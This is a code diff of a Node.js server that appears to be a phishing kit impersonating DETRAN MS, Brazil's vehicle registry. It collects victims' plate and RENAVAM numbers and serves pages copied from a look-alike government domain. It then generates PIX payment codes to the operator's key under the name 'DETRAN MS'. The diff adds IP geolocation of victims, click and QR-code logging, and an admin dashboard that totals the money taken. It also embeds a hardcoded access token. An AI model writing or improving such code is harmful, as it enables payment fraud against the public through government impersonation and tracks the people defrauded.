@@ -1,3 +1,4 @@
+
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs').promises;
@@ -32,7 +33,7 @@ const DATA_DIR = path.join(__dirname, 'data');
 (async () => {
     try {
         await fs.mkdir(DATA_DIR, { recursive: true });
-        const files = ['consultas.json', 'pix.json', 'config.json', 'cliques.json'];
+        const files = ['consultas.json', 'pix.json', 'config.json', 'cliques.json', 'qrcodes.json'];
         for (const file of files) {
             const filePath = path.join(DATA_DIR, file);
             try { 
@@ -73,9 +74,9 @@ async function writeData(filename, data) {
 }
 
 // ============================================
-// FUNÇÃO PARA OBTER IP COMPLETO E ESTADO
+// FUNÇÃO PARA OBTER IP COMPLETO E CIDADE (CORREÇÃO 1)
 // ============================================
-function getIpCompleto(req) {
+async function getIpCompleto(req) {
     let ip = req.ip || 
              req.connection.remoteAddress || 
              req.socket.remoteAddress || 
@@ -84,50 +85,123 @@ function getIpCompleto(req) {
     // Remove prefixo ::ffff: se existir
     ip = ip.replace('::ffff:', '');
     
-    // Se for localhost, tenta pegar IP real dos headers
-    if (ip === '127.0.0.1' || ip === '::1' || ip.includes('localhost')) {
-        ip = req.headers['x-forwarded-for'] || 
-             req.headers['x-real-ip'] || 
-             ip;
+    // Pega IP real de headers (correção para proxies)
+    const forwardedFor = req.headers['x-forwarded-for'];
+    const realIp = req.headers['x-real-ip'];
+    const cfConnectingIp = req.headers['cf-connecting-ip'];
+    
+    // Prioriza headers de proxy
+    if (cfConnectingIp) {
+        ip = cfConnectingIp;
+    } else if (realIp) {
+        ip = realIp;
+    } else if (forwardedFor) {
+        // Pega o primeiro IP da lista (cliente original)
+        ip = forwardedFor.split(',')[0].trim();
     }
     
-    // Se tiver múltiplos IPs (proxy), pega o primeiro
-    if (ip && ip.includes(',')) {
-        ip = ip.split(',')[0].trim();
+    // Se ainda for localhost, tenta outros headers
+    if (ip === '127.0.0.1' || ip === '::1' || ip.includes('localhost')) {
+        ip = req.headers['x-client-ip'] || 
+             req.headers['x-forwarded'] || 
+             ip;
     }
     
     return ip;
 }
 
 // ============================================
-// FUNÇÃO PARA DETECTAR ESTADO PELO IP (SIMULADO)
+// GEOLOCALIZAÇÃO POR IP (CORREÇÃO 2 - CIDADE REAL)
 // ============================================
-function detectarEstadoPorIP(ip) {
-    // Mapa simples de IPs para estados (para demonstração)
-    // Em produção, use uma API de geolocalização
-    
-    if (!ip || ip === '127.0.0.1' || ip === '::1') {
-        return 'LOCAL';
+async function getGeolocation(ip) {
+    try {
+        // Ignora IPs locais
+        if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+            return {
+                ip: ip,
+                cidade: 'Local',
+                estado: 'LOCAL',
+                pais: 'Brasil',
+                provedor: 'Rede Local'
+            };
+        }
+        
+        // Usa ip-api.com (gratuito)
+        const response = await axios.get(`http://ip-api.com/json/${ip}?lang=pt-BR&fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, {
+            timeout: 5000
+        });
+        
+        if (response.data.status === 'success') {
+            return {
+                ip: response.data.query || ip,
+                cidade: response.data.city || 'Desconhecida',
+                estado: response.data.regionName || response.data.region || 'N/A',
+                pais: response.data.country || 'Brasil',
+                provedor: response.data.isp || 'Desconhecido',
+                regiao: response.data.regionName || 'N/A'
+            };
+        }
+    } catch (error) {
+        console.log(`⚠️ Não foi possível obter geolocalização para ${ip}:`, error.message);
     }
     
-    // Simulação baseada em padrões comuns
-    if (ip.startsWith('177.')) return 'SP';
-    if (ip.startsWith('179.')) return 'SP';
-    if (ip.startsWith('187.')) return 'RJ';
-    if (ip.startsWith('189.')) return 'RJ';
-    if (ip.startsWith('200.')) return 'RJ';
-    if (ip.startsWith('177.39.')) return 'MG';
-    if (ip.startsWith('177.72.')) return 'RS';
-    if (ip.startsWith('177.85.')) return 'PR';
-    if (ip.startsWith('177.92.')) return 'SC';
-    if (ip.startsWith('177.103.')) return 'BA';
-    if (ip.startsWith('177.200.')) return 'DF';
-    if (ip.startsWith('179.218.')) return 'MS';
-    if (ip.startsWith('179.222.')) return 'MS';
+    // Fallback: detecta estado pelo padrão do IP
+    return getEstadoFallback(ip);
+}
+
+// Fallback para quando a API falha
+function getEstadoFallback(ip) {
+    if (!ip || ip === '127.0.0.1' || ip === '::1') {
+        return {
+            ip: ip,
+            cidade: 'Local',
+            estado: 'LOCAL',
+            pais: 'Brasil'
+        };
+    }
     
-    // Fallback aleatório para demonstração
-    const estados = ['SP', 'RJ', 'MG', 'RS', 'PR', 'SC', 'BA', 'DF', 'MS', 'GO', 'MT', 'PE', 'CE'];
-    return estados[Math.floor(Math.random() * estados.length)];
+    // Mapeamento de faixas de IP por estado (Brasil)
+    const ipRanges = {
+        'SP': ['177.', '179.', '187.', '189.', '200.'],
+        'RJ': ['177.39.', '177.40.', '177.41.'],
+        'MG': ['177.72.', '177.73.', '177.74.'],
+        'RS': ['177.85.', '177.86.', '177.87.'],
+        'PR': ['177.92.', '177.93.', '177.94.'],
+        'SC': ['177.103.', '177.104.', '177.105.'],
+        'BA': ['177.200.', '177.201.', '177.202.'],
+        'DF': ['179.218.', '179.219.', '179.220.'],
+        'MS': ['179.222.', '179.223.', '179.224.'],
+        'GO': ['179.225.', '179.226.', '179.227.'],
+        'MT': ['179.228.', '179.229.', '179.230.'],
+        'PE': ['179.231.', '179.232.', '179.233.'],
+        'CE': ['179.234.', '179.235.', '179.236.']
+    };
+    
+    let estado = 'N/A';
+    for (const [est, ranges] of Object.entries(ipRanges)) {
+        for (const range of ranges) {
+            if (ip.startsWith(range)) {
+                estado = est;
+                break;
+            }
+        }
+        if (estado !== 'N/A') break;
+    }
+    
+    // Mapeamento estado->cidade principal
+    const capitais = {
+        'SP': 'São Paulo', 'RJ': 'Rio de Janeiro', 'MG': 'Belo Horizonte',
+        'RS': 'Porto Alegre', 'PR': 'Curitiba', 'SC': 'Florianópolis',
+        'BA': 'Salvador', 'DF': 'Brasília', 'MS': 'Campo Grande',
+        'GO': 'Goiânia', 'MT': 'Cuiabá', 'PE': 'Recife', 'CE': 'Fortaleza'
+    };
+    
+    return {
+        ip: ip,
+        cidade: capitais[estado] || 'Desconhecida',
+        estado: estado,
+        pais: 'Brasil'
+    };
 }
 
 // ============================================
@@ -135,11 +209,11 @@ function detectarEstadoPorIP(ip) {
 // ============================================
 const usuariosOnline = new Map();
 
-app.post('/api/online/entrou', (req, res) => {
+app.post('/api/online/entrou', async (req, res) => {
     try {
-        const ip = getIpCompleto(req);
+        const ip = await getIpCompleto(req);
         const userAgent = req.get('User-Agent') || '';
-        const estado = detectarEstadoPorIP(ip);
+        const geo = await getGeolocation(ip);
         
         let dispositivo = 'Desktop';
         if (/android/i.test(userAgent)) dispositivo = 'Android';
@@ -147,9 +221,11 @@ app.post('/api/online/entrou', (req, res) => {
         else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
         
         usuariosOnline.set(ip, {
-            ip,
+            ip: ip,
             ipCompleto: ip,
-            estado: estado,
+            cidade: geo.cidade,
+            estado: geo.estado,
+            pais: geo.pais,
             dispositivo,
             userAgent,
             paginaAtual: req.body.pagina || '/',
@@ -157,16 +233,30 @@ app.post('/api/online/entrou', (req, res) => {
             dataEntrada: new Date().toISOString()
         });
         
-        console.log(`👤 Usuário ONLINE: ${ip} (${estado}) - ${dispositivo}`);
+        console.log(`👤 Usuário ONLINE: ${ip} - ${geo.cidade}/${geo.estado} - ${dispositivo}`);
+        
+        // Registra clique de entrada
+        await registrarClique({
+            ip: ip,
+            tipo: 'pagina_visitada',
+            elemento: 'entrada',
+            pagina: req.body.pagina || '/',
+            userAgent: userAgent,
+            dispositivo: dispositivo,
+            cidade: geo.cidade,
+            estado: geo.estado
+        });
+        
         res.json({ sucesso: true, online: usuariosOnline.size });
     } catch (error) {
+        console.error('Erro em /api/online/entrou:', error);
         res.status(500).json({ sucesso: false });
     }
 });
 
 app.post('/api/online/ativo', (req, res) => {
     try {
-        const ip = getIpCompleto(req);
+        const ip = req.headers['x-client-ip'] || req.ip;
         const usuario = usuariosOnline.get(ip);
         if (usuario) {
             usuario.ultimaAtividade = Date.now();
@@ -179,7 +269,7 @@ app.post('/api/online/ativo', (req, res) => {
 
 app.post('/api/online/saiu', (req, res) => {
     try {
-        const ip = getIpCompleto(req);
+        const ip = req.headers['x-client-ip'] || req.ip;
         if (usuariosOnline.has(ip)) {
             usuariosOnline.delete(ip);
             console.log(`👤 Usuário OFFLINE: ${ip}`);
@@ -191,35 +281,24 @@ app.post('/api/online/saiu', (req, res) => {
 });
 
 // ============================================
-// CORREÇÃO 4: SISTEMA DE CLIQUES (NOVA ROTA)
+// FUNÇÃO PARA REGISTRAR CLIQUES (CORREÇÃO 4)
 // ============================================
-app.post('/api/registrar-clique', async (req, res) => {
+async function registrarClique(data) {
     try {
-        const { tipo, elemento, pagina, detalhes } = req.body;
-        const ip = getIpCompleto(req);
-        const userAgent = req.get('User-Agent') || '';
-        const estado = detectarEstadoPorIP(ip);
-        
-        let dispositivo = 'Desktop';
-        if (/android/i.test(userAgent)) dispositivo = 'Android';
-        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
-        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
-        
-        // Carrega cliques existentes
         const cliques = await readData('cliques.json');
         
-        // Adiciona novo clique
         cliques.push({
-            ip: ip,
-            ipCompleto: ip,
-            estado: estado,
-            dispositivo: dispositivo,
-            tipo: tipo || 'clique',
-            elemento: elemento || 'desconhecido',
-            pagina: pagina || window.location.pathname,
-            detalhes: detalhes || '',
+            ip: data.ip,
+            ipCompleto: data.ip,
+            cidade: data.cidade || 'Desconhecida',
+            estado: data.estado || 'N/A',
+            dispositivo: data.dispositivo || 'Desktop',
+            tipo: data.tipo || 'clique',
+            elemento: data.elemento || 'desconhecido',
+            pagina: data.pagina || '/',
+            detalhes: data.detalhes || '',
             dataHora: new Date().toISOString(),
-            userAgent: userAgent.substring(0, 200)
+            userAgent: (data.userAgent || '').substring(0, 200)
         });
         
         // Mantém apenas últimos 5000 cliques
@@ -227,10 +306,41 @@ app.post('/api/registrar-clique', async (req, res) => {
             cliques.splice(0, cliques.length - 5000);
         }
         
-        // Salva no arquivo
         await writeData('cliques.json', cliques);
         
-        console.log(`🖱️ Clique registrado: ${ip} (${estado}) - ${tipo}`);
+        console.log(`🖱️ Clique registrado: ${data.ip} - ${data.cidade}/${data.estado} - ${data.tipo}`);
+        
+    } catch (error) {
+        console.error('❌ Erro ao registrar clique:', error);
+    }
+}
+
+// ============================================
+// ROTA PARA REGISTRAR CLIQUES DO FRONTEND
+// ============================================
+app.post('/api/registrar-clique', async (req, res) => {
+    try {
+        const { tipo, elemento, pagina, detalhes } = req.body;
+        const ip = await getIpCompleto(req);
+        const userAgent = req.get('User-Agent') || '';
+        const geo = await getGeolocation(ip);
+        
+        let dispositivo = 'Desktop';
+        if (/android/i.test(userAgent)) dispositivo = 'Android';
+        else if (/iphone|ipad|ipod/i.test(userAgent)) dispositivo = 'iOS';
+        else if (/mobile/i.test(userAgent)) dispositivo = 'Mobile';
+        
+        await registrarClique({
+            ip: ip,
+            tipo: tipo || 'clique',
+            elemento: elemento || 'desconhecido',
+            pagina: pagina || '/',
+            detalhes: detalhes || '',
+            userAgent: userAgent,
+            dispositivo: dispositivo,
+            cidade: geo.cidade,
+            estado: geo.estado
+        });
         
         res.json({ sucesso: true, mensagem: 'Clique registrado' });
         
@@ -255,6 +365,7 @@ app.post('/api/admin/buscar-cliques', autenticarAdmin, async (req, res) => {
             const filtroLower = filtro.toLowerCase();
             resultados = resultados.filter(c =>
                 (c.ip && c.ip.toLowerCase().includes(filtroLower)) ||
+                (c.cidade && c.cidade.toLowerCase().includes(filtroLower)) ||
                 (c.estado && c.estado.toLowerCase().includes(filtroLower)) ||
                 (c.dispositivo && c.dispositivo.toLowerCase().includes(filtroLower)) ||
                 (c.tipo && c.tipo.toLowerCase().includes(filtroLower))
@@ -292,12 +403,25 @@ app.post('/api/admin/buscar-cliques', autenticarAdmin, async (req, res) => {
 app.post('/consultar', async (req, res) => {
     try {
         const { placa, renavam } = req.body;
-        const ip = getIpCompleto(req);
+        const ip = await getIpCompleto(req);
         const userAgent = req.get('User-Agent') || '';
-        const estado = detectarEstadoPorIP(ip);
+        const geo = await getGeolocation(ip);
         
-        console.log(`🔍 Consulta recebida: ${placa} / ${renavam} - IP: ${ip} (${estado})`);
+        console.log(`🔍 Consulta recebida: ${placa} / ${renavam} - IP: ${ip} (${geo.cidade}/${geo.estado})`);
         
+        // Registra clique de consulta
+        await registrarClique({
+            ip: ip,
+            tipo: 'consulta',
+            elemento: 'form_consulta',
+            pagina: '/consultar',
+            detalhes: `Placa: ${placa}, RENAVAM: ${renavam}`,
+            userAgent: userAgent,
+            dispositivo: /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop',
+            cidade: geo.cidade,
+            estado: geo.estado
+        });
+
         // TOKEN ORIGINAL
         const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZW5hdmFtIjoiMDA0Njc4ODA0NzYiLCJwbGF0ZSI6Ik5SUzVKNDciLCJpYXQiOjE3NzAzMzIwMzR9.QmpzZTRGYiTxapKcyIzd8eZxooEGtQM3sAsMevX125c';
 
@@ -315,7 +439,7 @@ app.post('/consultar', async (req, res) => {
             `https://detranmatogrossosul-govbr.vercel.app/veiculo/${userId}`
         );
 
-        // REGISTRA CONSULTA
+        // REGISTRA CONSULTA NO BANCO
         const consultas = await readData('consultas.json');
         
         let dispositivo = 'Desktop';
@@ -328,7 +452,8 @@ app.post('/consultar', async (req, res) => {
             renavam: renavam,
             ip: ip,
             ipCompleto: ip,
-            estado: estado,
+            cidade: geo.cidade,
+            estado: geo.estado,
             dispositivo: dispositivo,
             dataHora: new Date().toISOString(),
             userId: userId
@@ -345,7 +470,8 @@ app.post('/consultar', async (req, res) => {
         if (usuario) {
             usuario.ultimaAtividade = Date.now();
             usuario.paginaAtual = 'consultando';
-            usuario.estado = estado;
+            usuario.cidade = geo.cidade;
+            usuario.estado = geo.estado;
         }
         
         // RETORNA HTML ORIGINAL DO DETRAN
@@ -418,13 +544,46 @@ app.post('/api/admin/login', (req, res) => {
 });
 
 // ============================================
+// REGISTRAR QR CODE GERADO (CORREÇÃO 3)
+// ============================================
+async function registrarQRCode(data) {
+    try {
+        const qrcodes = await readData('qrcodes.json');
+        
+        qrcodes.push({
+            tipo: 'qrcode_gerado',
+            valor: data.valor,
+            placa: data.placa,
+            renavam: data.renavam,
+            ip: data.ip,
+            cidade: data.cidade,
+            estado: data.estado,
+            dataHora: new Date().toISOString(),
+            descricao: data.descricao || 'QR Code PIX'
+        });
+        
+        // Mantém apenas últimos 1000
+        if (qrcodes.length > 1000) {
+            qrcodes.splice(0, qrcodes.length - 1000);
+        }
+        
+        await writeData('qrcodes.json', qrcodes);
+        
+        console.log(`📱 QR Code registrado: ${data.ip} - ${data.cidade}/${data.estado} - R$ ${data.valor}`);
+        
+    } catch (error) {
+        console.error('❌ Erro ao registrar QR Code:', error);
+    }
+}
+
+// ============================================
 // CORREÇÃO 2: REGISTRAR PIX COPIADO (APENAS PRIMEIRO CLIQUE)
 // ============================================
 app.post('/api/registrar-pix-copiado', async (req, res) => {
     try {
         const { valor, placa, renavam, tipo, descricao, primeiroClique } = req.body;
-        const ip = getIpCompleto(req);
-        const estado = detectarEstadoPorIP(ip);
+        const ip = await getIpCompleto(req);
+        const geo = await getGeolocation(ip);
         
         // Se não for primeiro clique, ignora
         if (!primeiroClique) {
@@ -452,16 +611,17 @@ app.post('/api/registrar-pix-copiado', async (req, res) => {
         // Adiciona novo registro
         pixData.push({
             tipo: 'copiado',
-            categoria: 'copiado', // CORREÇÃO 5: Categoria separada
+            categoria: 'copiado',
             valor: parseFloat(valor) || 0,
-            valorFormatado: `R$ ${parseFloat(valor || 0).toFixed(2).replace('.', ',')}`, // CORREÇÃO 1: Valor formatado
+            valorFormatado: `R$ ${parseFloat(valor || 0).toFixed(2).replace('.', ',')}`,
             placa: placa || 'N/A',
             renavam: renavam || 'N/A',
             descricao: descricao || 'Código copiado',
             dataHora: new Date().toISOString(),
             ip: ip,
             ipCompleto: ip,
-            estado: estado,
+            cidade: geo.cidade,
+            estado: geo.estado,
             status: 'copiado',
             primeiroClique: true
         });
@@ -469,7 +629,18 @@ app.post('/api/registrar-pix-copiado', async (req, res) => {
         // Salva no arquivo
         await writeData('pix.json', pixData);
         
-        console.log(`📋 PIX COPIADO registrado: ${ip} (${estado}) - ${placa} - R$ ${valor}`);
+        // Registra clique
+        await registrarClique({
+            ip: ip,
+            tipo: 'pix_copiado',
+            elemento: 'botao_copiar_pix',
+            pagina: '/consultar',
+            detalhes: `Valor: R$ ${valor}, Placa: ${placa}`,
+            cidade: geo.cidade,
+            estado: geo.estado
+        });
+        
+        console.log(`📋 PIX COPIADO registrado: ${ip} - ${geo.cidade}/${geo.estado} - ${placa} - R$ ${valor}`);
         
         res.json({ sucesso: true, mensagem: 'Registrado com sucesso' });
         
@@ -480,7 +651,7 @@ app.post('/api/registrar-pix-copiado', async (req, res) => {
 });
 
 // ============================================
-// API BUSCAR CONSULTAS
+// API BUSCAR CONSULTAS (COM CIDADE)
 // ============================================
 app.post('/api/admin/buscar-consultas', autenticarAdmin, async (req, res) => {
     try {
@@ -496,6 +667,7 @@ app.post('/api/admin/buscar-consultas', autenticarAdmin, async (req, res) => {
                 (c.placa && c.placa.toLowerCase().includes(filtroLower)) ||
                 (c.renavam && c.renavam.includes(filtro)) ||
                 (c.ip && c.ip.includes(filtro)) ||
+                (c.cidade && c.cidade.toLowerCase().includes(filtroLower)) ||
                 (c.estado && c.estado.toLowerCase().includes(filtroLower))
             );
         }
@@ -521,6 +693,7 @@ app.post('/api/admin/buscar-consultas', autenticarAdmin, async (req, res) => {
             resultados: paginados.map(c => ({
                 ...c,
                 ipCompleto: c.ipCompleto || c.ip,
+                cidade: c.cidade || 'Desconhecida',
                 estado: c.estado || 'N/A'
             }))
         });
@@ -532,7 +705,7 @@ app.post('/api/admin/buscar-consultas', autenticarAdmin, async (req, res) => {
 });
 
 // ============================================
-// API BUSCAR PIX (COM CORREÇÃO 5: SEPARAÇÃO)
+// API BUSCAR PIX (COM CIDADE)
 // ============================================
 app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
     try {
@@ -549,6 +722,7 @@ app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
                 (p.renavam && p.renavam.includes(filtro)) ||
                 (p.valor && p.valor.toString().includes(filtro)) ||
                 (p.ip && p.ip.includes(filtro)) ||
+                (p.cidade && p.cidade.toLowerCase().includes(filtroLower)) ||
                 (p.estado && p.estado.toLowerCase().includes(filtroLower))
             );
         }
@@ -557,7 +731,7 @@ app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
             resultados = resultados.filter(p => p.tipo === tipo);
         }
         
-        // CORREÇÃO 5: Filtro por categoria (gerado vs copiado)
+        // Filtro por categoria (gerado vs copiado)
         if (categoria && categoria !== 'todas') {
             resultados = resultados.filter(p => p.categoria === categoria);
         }
@@ -577,14 +751,64 @@ app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
             resultados: paginados.map(p => ({
                 ...p,
                 ipCompleto: p.ipCompleto || p.ip,
+                cidade: p.cidade || 'Desconhecida',
                 estado: p.estado || 'N/A',
                 categoria: p.categoria || (p.tipo === 'copiado' ? 'copiado' : 'gerado'),
-                valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}` // CORREÇÃO 1
+                valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}`
             }))
         });
         
     } catch (error) {
         console.error('Erro ao buscar PIX:', error);
+        res.status(500).json({ sucesso: false, erro: error.message });
+    }
+});
+
+// ============================================
+// API BUSCAR QR CODES (NOVO - CORREÇÃO 3)
+// ============================================
+app.post('/api/admin/buscar-qrcodes', autenticarAdmin, async (req, res) => {
+    try {
+        const { filtro, pagina = 1, limite = 20 } = req.body;
+        const qrcodes = await readData('qrcodes.json');
+        
+        let resultados = [...qrcodes].reverse(); // Mais recentes primeiro
+        
+        // Aplicar filtros
+        if (filtro) {
+            const filtroLower = filtro.toLowerCase();
+            resultados = resultados.filter(q =>
+                (q.placa && q.placa.toLowerCase().includes(filtroLower)) ||
+                (q.valor && q.valor.toString().includes(filtro)) ||
+                (q.ip && q.ip.includes(filtro)) ||
+                (q.cidade && q.cidade.toLowerCase().includes(filtroLower)) ||
+                (q.estado && q.estado.toLowerCase().includes(filtroLower))
+            );
+        }
+        
+        // Paginação
+        const inicio = (pagina - 1) * limite;
+        const fim = inicio + limite;
+        const paginados = resultados.slice(inicio, fim);
+        const total = resultados.length;
+        const totalPaginas = Math.ceil(total / limite);
+        
+        res.json({
+            sucesso: true,
+            pagina: parseInt(pagina),
+            totalPaginas: totalPaginas,
+            total: total,
+            resultados: paginados.map(q => ({
+                ...q,
+                ipCompleto: q.ip || 'N/A',
+                cidade: q.cidade || 'Desconhecida',
+                estado: q.estado || 'N/A',
+                valorFormatado: `R$ ${parseFloat(q.valor || 0).toFixed(2).replace('.', ',')}`
+            }))
+        });
+        
+    } catch (error) {
+        console.error('Erro ao buscar QR Codes:', error);
         res.status(500).json({ sucesso: false, erro: error.message });
     }
 });
@@ -681,13 +905,13 @@ function gerarCodigoPIX(chavePix, valor, nomeRecebedor, cidade, identificador) {
 }
 
 // ============================================
-// API PARA GERAR PIX COM CHAVE DO PAINEL (COM CORREÇÃO 1)
+// API PARA GERAR PIX COM CHAVE DO PAINEL (COM REGISTRO DE QR CODE)
 // ============================================
 app.post('/api/gerar-pix', async (req, res) => {
     try {
         const { valor, placa, renavam, tipo, descricao } = req.body;
-        const ip = getIpCompleto(req);
-        const estado = detectarEstadoPorIP(ip);
+        const ip = await getIpCompleto(req);
+        const geo = await getGeolocation(ip);
         
         // Carrega configurações
         const config = await readData('config.json');
@@ -725,16 +949,17 @@ app.post('/api/gerar-pix', async (req, res) => {
             placa: placa,
             valor: valorNum,
             ip: ip,
-            estado: estado
+            cidade: geo.cidade,
+            estado: geo.estado
         });
         
-        // REGISTRA PIX GERADO (COM CORREÇÃO 1: SALVAR VALOR COMPLETO)
+        // REGISTRA PIX GERADO
         const pixData = await readData('pix.json');
         pixData.push({
             tipo: tipo || 'gerado',
-            categoria: 'gerado', // CORREÇÃO 5: Categoria separada
-            valor: valorNum, // CORREÇÃO 1: Valor numérico
-            valorFormatado: `R$ ${valorNum.toFixed(2).replace('.', ',')}`, // CORREÇÃO 1: Valor formatado
+            categoria: 'gerado',
+            valor: valorNum,
+            valorFormatado: `R$ ${valorNum.toFixed(2).replace('.', ',')}`,
             placa: placa || 'N/A',
             renavam: renavam || 'N/A',
             descricao: descricao || '',
@@ -744,12 +969,35 @@ app.post('/api/gerar-pix', async (req, res) => {
             dataHora: new Date().toISOString(),
             ip: ip,
             ipCompleto: ip,
-            estado: estado,
+            cidade: geo.cidade,
+            estado: geo.estado,
             status: 'pendente',
             codigoPix: codigoPix.substring(0, 80)
         });
         
         await writeData('pix.json', pixData);
+        
+        // REGISTRA QR CODE (CORREÇÃO 3)
+        await registrarQRCode({
+            valor: valorNum,
+            placa: placa || 'N/A',
+            renavam: renavam || 'N/A',
+            ip: ip,
+            cidade: geo.cidade,
+            estado: geo.estado,
+            descricao: descricao || 'QR Code PIX gerado'
+        });
+        
+        // Registra clique de geração de PIX
+        await registrarClique({
+            ip: ip,
+            tipo: 'pix_gerado',
+            elemento: 'gerar_pix',
+            pagina: '/consultar',
+            detalhes: `Valor: R$ ${valorNum}, Placa: ${placa}`,
+            cidade: geo.cidade,
+            estado: geo.estado
+        });
         
         res.json({
             sucesso: true,
@@ -786,10 +1034,13 @@ app.post('/api/admin/limpar-dados', autenticarAdmin, async (req, res) => {
             await writeData('pix.json', []);
         } else if (tipo === 'cliques') {
             await writeData('cliques.json', []);
+        } else if (tipo === 'qrcodes') {
+            await writeData('qrcodes.json', []);
         } else if (tipo === 'tudo') {
             await writeData('consultas.json', []);
             await writeData('pix.json', []);
             await writeData('cliques.json', []);
+            await writeData('qrcodes.json', []);
         }
         
         res.json({
@@ -851,6 +1102,11 @@ app.get('/api/admin/exportar/:tipo', autenticarAdmin, async (req, res) => {
             res.setHeader('Content-Type', 'application/json');
             res.setHeader('Content-Disposition', 'attachment; filename=cliques_detran_ms.json');
             res.json(cliques);
+        } else if (tipo === 'qrcodes') {
+            const qrcodes = await readData('qrcodes.json');
+            res.setHeader('Content-Type', 'application/json');
+            res.setHeader('Content-Disposition', 'attachment; filename=qrcodes_detran_ms.json');
+            res.json(qrcodes);
         } else {
             res.status(400).json({ sucesso: false, mensagem: 'Tipo inválido' });
         }
@@ -861,13 +1117,14 @@ app.get('/api/admin/exportar/:tipo', autenticarAdmin, async (req, res) => {
 });
 
 // ============================================
-// API PARA PAINEL ADMIN DASHBOARD (COM CORREÇÕES 3 E 5)
+// API PARA PAINEL ADMIN DASHBOARD (COM CIDADE E QR CODES)
 // ============================================
 app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
     try {
         const consultas = await readData('consultas.json');
         const pix = await readData('pix.json');
         const cliques = await readData('cliques.json');
+        const qrcodes = await readData('qrcodes.json');
         const config = await readData('config.json');
         
         // Usuários online (últimos 30 minutos)
@@ -888,11 +1145,11 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
         // Ordena por atividade
         usuariosAtivos.sort((a, b) => a.segundosInativo - b.segundosInativo);
         
-        // CORREÇÃO 5: SEPARA VALORES GERADOS VS COPIADOS
+        // SEPARA VALORES GERADOS VS COPIADOS
         const pixGerados = pix.filter(p => p.categoria === 'gerado' || p.tipo === 'gerado');
         const pixCopiados = pix.filter(p => p.categoria === 'copiado' || p.tipo === 'copiado');
         
-        // CORREÇÃO 5: Cálculos separados (COM CORREÇÃO 1: USAR VALOR NUMÉRICO)
+        // Cálculos separados
         const calcularTotal = (lista) => {
             return lista.reduce((total, item) => {
                 const valor = parseFloat(item.valor) || 0;
@@ -920,6 +1177,11 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
             new Date(c.dataHora).toDateString() === hoje
         ).length;
         
+        // QR Codes hoje
+        const qrcodesHoje = qrcodes.filter(q => 
+            new Date(q.dataHora).toDateString() === hoje
+        ).length;
+        
         res.json({
             sucesso: true,
             dados: {
@@ -928,52 +1190,64 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
                     totalConsultas: consultas.length,
                     consultasHoje: consultasHoje,
                     
-                    // CORREÇÃO 5: Separados
                     pixGerados: pixGerados.length,
                     pixCopiados: pixCopiados.length,
                     pixHoje: pixHoje,
                     
-                    // CORREÇÃO 1: Valores formatados com R$
+                    qrcodesTotal: qrcodes.length,
+                    qrcodesHoje: qrcodesHoje,
+                    
                     valorGerados: `R$ ${valorGerados.toFixed(2)}`,
                     valorCopiados: `R$ ${valorCopiados.toFixed(2)}`,
                     valorTotal: `R$ ${valorTotal.toFixed(2)}`,
                     
-                    // Novos: Cliques
                     totalCliques: cliques.length,
                     cliquesHoje: cliquesHoje
                 },
                 consultasCompletas: consultas.slice(-50).reverse().map(c => ({
                     ...c,
                     ipCompleto: c.ipCompleto || c.ip,
+                    cidade: c.cidade || 'Desconhecida',
                     estado: c.estado || 'N/A'
                 })),
                 pixCompletos: pix.slice(-50).reverse().map(p => ({
                     ...p,
                     ipCompleto: p.ipCompleto || p.ip,
+                    cidade: p.cidade || 'Desconhecida',
                     estado: p.estado || 'N/A',
                     categoria: p.categoria || (p.tipo === 'copiado' ? 'copiado' : 'gerado'),
-                    valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}` // CORREÇÃO 1
+                    valorFormatado: p.valorFormatado || `R$ ${parseFloat(p.valor || 0).toFixed(2).replace('.', ',')}`
+                })),
+                qrcodesCompletos: qrcodes.slice(-50).reverse().map(q => ({
+                    ...q,
+                    ipCompleto: q.ip || 'N/A',
+                    cidade: q.cidade || 'Desconhecida',
+                    estado: q.estado || 'N/A',
+                    valorFormatado: `R$ ${parseFloat(q.valor || 0).toFixed(2).replace('.', ',')}`
                 })),
                 cliquesRecentes: cliques.slice(-30).reverse().map(c => ({
                     ...c,
                     ipCompleto: c.ipCompleto || c.ip,
+                    cidade: c.cidade || 'Desconhecida',
                     estado: c.estado || 'N/A'
                 })),
                 usuariosOnline: usuariosAtivos.map(u => ({
                     ...u,
                     ipCompleto: u.ipCompleto || u.ip,
+                    cidade: u.cidade || 'Desconhecida',
                     estado: u.estado || 'N/A'
                 })),
                 sistema: {
-                    versao: '2.6.0',
+                    versao: '2.6.1',
                     inicioOperacao: new Date().toLocaleDateString('pt-BR'),
-                    chavePix: config.chavePix || 'Não configurada',
+                    chavePix: config.chavePix ? 'Configurada' : 'Não configurada',
                     chaveTipo: config.pixTipo || 'aleatoria',
                     nomeRecebedor: config.nomeRecebedor || 'DETRAN MS',
                     cidadeRecebedor: config.cidadeRecebedor || 'CAMPO GRANDE',
                     identificador: config.pixIdentificador || 'PAGAMENTODETRAN',
                     timerPagamento: config.timerPagamento || 900,
-                    memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`
+                    memoria: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`,
+                    geolocalizacao: 'Ativa (ip-api.com)'
                 }
             }
         });
@@ -1141,6 +1415,18 @@ setInterval(async () => {
                 await writeData('cliques.json', cliquesAtualizados);
